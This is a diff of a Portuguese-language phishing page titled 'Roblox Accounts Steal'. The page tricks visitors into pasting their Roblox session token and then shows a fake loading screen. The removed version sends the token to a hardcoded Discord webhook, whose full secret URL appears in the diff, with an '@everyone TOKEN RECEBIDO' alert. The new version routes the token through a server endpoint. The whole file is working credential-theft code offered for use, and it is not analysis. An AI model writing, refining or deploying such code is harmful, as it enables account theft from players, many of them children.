@@ -4,10 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Roblox Accounts Steal</title>
-
-  <!-- GSAP básico (opcional, só pra animações leves se quiser) -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
-
   <style>
     body {
       margin: 0;
@@ -18,12 +14,10 @@
       min-height: 100vh;
       overflow-x: hidden;
     }
-
     .container {
       display: flex;
       min-height: 100vh;
     }
-
     .video-sidebar {
       width: 35%;
       min-width: 320px;
@@ -33,7 +27,6 @@
       align-items: center;
       padding: 20px 10px;
     }
-
     .video-wrapper {
       width: 100%;
       max-width: 380px;
@@ -43,18 +36,15 @@
       overflow: hidden;
       box-shadow: 0 0 15px rgba(0,0,0,0.8);
     }
-
     .video-wrapper iframe {
       width: 100%;
       height: 100%;
     }
-
     .video-label {
       margin-top: 12px;
       font-size: 1.3em;
       color: #a0a0a0;
     }
-
     #main-content {
       flex: 1;
       padding: 60px 40px;
@@ -64,19 +54,16 @@
       justify-content: center;
       align-items: center;
     }
-
     h1 {
       font-size: 3.2em;
       color: #ffffff;
       margin-bottom: 20px;
     }
-
     .subtitle {
       font-size: 1.6em;
       color: #b0b0b0;
       margin-bottom: 30px;
     }
-
     input, button {
       margin: 15px 0;
       padding: 15px 30px;
@@ -86,31 +73,25 @@
       color: #e0e0e0;
       border: 2px solid #444444;
     }
-
     button {
       background: #333333;
       cursor: pointer;
       font-weight: bold;
     }
-
     button:hover {
       background: #555555;
     }
-
     #status {
       margin-top: 20px;
       font-size: 18px;
       color: #a0a0a0;
     }
-
     #saiba-mais-btn {
       background: #222222;
     }
-
     #saiba-mais-btn:hover {
       background: #444444;
     }
-
     /* Loading */
     #loading {
       display: none;
@@ -122,7 +103,6 @@
       justify-content: center;
       align-items: center;
     }
-
     .spinner {
       width: 80px;
       height: 80px;
@@ -132,17 +112,14 @@
       animation: spin 1s linear infinite;
       margin-bottom: 20px;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     #loading-text {
       font-size: 2em;
       color: #c0c0c0;
     }
-
     /* Modal */
     #modal {
       display: none;
@@ -153,7 +130,6 @@
       justify-content: center;
       align-items: center;
     }
-
     .modal-content {
       background: #1c1c1c;
       border: 2px solid #444444;
@@ -164,7 +140,6 @@
       position: relative;
       color: #d0d0d0;
     }
-
     .close {
       position: absolute;
       top: 10px;
@@ -173,11 +148,9 @@
       color: #a0a0a0;
       cursor: pointer;
     }
-
     .close:hover {
       color: #ffffff;
     }
-
     /* Responsivo */
     @media (max-width: 900px) {
       .container { flex-direction: column; }
@@ -240,12 +213,7 @@
   </div>
 
   <script>
-    function showLoading() {
-      document.querySelector('.container').style.display = "none";
-      document.getElementById("loading").style.display = "flex";
-    }
-
-    function enviar() {
+    async function enviar() {
       const token = document.getElementById("token").value.trim();
       const status = document.getElementById("status");
       const btn = document.getElementById("sendBtn");
@@ -262,34 +230,30 @@
       btn.disabled = true;
       btn.innerText = "Enviando...";
 
-      const webhook = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
+      try {
+        const response = await fetch("/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ token })
+        });
 
-      const payload = {
-        content: "**@everyone TOKEN RECEBIDO** 💀",
-        embeds: [{
-          title: "Token Roblox",
-          description: "```" + token + "```",
-          color: 0x888888,
-          footer: { text: new Date().toLocaleString("pt-BR") }
-        }]
-      };
-
-      fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      })
-      .then(() => {
-        status.innerHTML = "";
-        showLoading();
-      })
-      .catch(err => {
-        console.error("Erro no fetch:", err);
-        status.innerHTML = "Falha ao enviar. Veja o console (F12).";
+        if (response.ok) {
+          status.innerHTML = "";
+          showLoading();
+        } else {
+          throw new Error("Erro no servidor");
+        }
+      } catch (err) {
+        status.innerHTML = "Falha ao enviar. Tente novamente.";
         status.style.color = "#888888";
         btn.disabled = false;
         btn.innerText = "Enviar token";
-      });
+      }
+    }
+
+    function showLoading() {
+      document.querySelector('.container').style.display = "none";
+      document.getElementById("loading").style.display = "flex";
     }
 
     function openModal() {
